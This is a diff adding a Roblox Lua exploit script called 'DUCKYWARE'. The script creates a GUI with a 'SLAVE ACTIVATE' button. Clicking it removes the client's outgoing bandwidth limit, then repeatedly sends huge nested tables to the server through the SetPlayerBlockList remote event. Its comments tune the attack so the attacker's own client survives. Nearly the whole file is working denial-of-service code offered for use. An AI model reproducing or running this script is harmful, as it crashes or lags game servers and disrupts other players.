@@ -1,1 +1,86 @@
-LAKAK
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(251, 125, 255)
+Frame.Position = UDim2.new(0.424117476, 0, 0.284875184, 0)
+Frame.Size = UDim2.new(0, 266, 0, 258)
+Frame.Active = true 
+Frame.Draggable = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(173, 10, 255)
+TextLabel.Size = UDim2.new(0, 266, 0, 50)
+TextLabel.Font = Enum.Font.Bangers
+TextLabel.Text = "DUCKYWARE"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 48.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(173, 10, 255)
+TextLabel_2.Position = UDim2.new(0, 0, 0.806201577, 0)
+TextLabel_2.Size = UDim2.new(0, 266, 0, 50)
+TextLabel_2.Font = Enum.Font.Kalam
+TextLabel_2.Text = "Made by ducky#9999"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 48.000
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(3, 251, 255)
+TextButton.Position = UDim2.new(0.255639076, 0, 0.403100789, 0)
+TextButton.Size = UDim2.new(0, 129, 0, 50)
+TextButton.Font = Enum.Font.Highway
+TextButton.Text = "SLAVE ACTIVATE"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.MouseButton1Down:connect(function()
+	while wait(0.3) do --// don't change it's the best
+		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		local function getmaxvalue(val)
+			local mainvalueifonetable = 499999
+			if type(val) ~= "number" then
+				return nil
+			end
+			local calculateperfectval = (mainvalueifonetable/(val+2))
+			return calculateperfectval
+		end
+		local function bomb(tableincrease, tries)
+			local maintable = {}
+			local spammedtable = {}
+			table.insert(spammedtable, {})
+			z = spammedtable[1]
+			for i = 1, tableincrease do
+				local tableins = {}
+				table.insert(z, tableins)
+				z = tableins
+			end
+			local calculatemax = getmaxvalue(tableincrease)
+			local maximum
+			if calculatemax then
+				maximum = calculatemax
+			else
+				maximum = 999999
+			end
+			for i = 1, maximum do
+				table.insert(maintable, spammedtable)
+			end
+			for i = 1, tries do
+				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+			end
+		end
+		bomb(1, 1) --// change values if client crashes
+	end
+end)
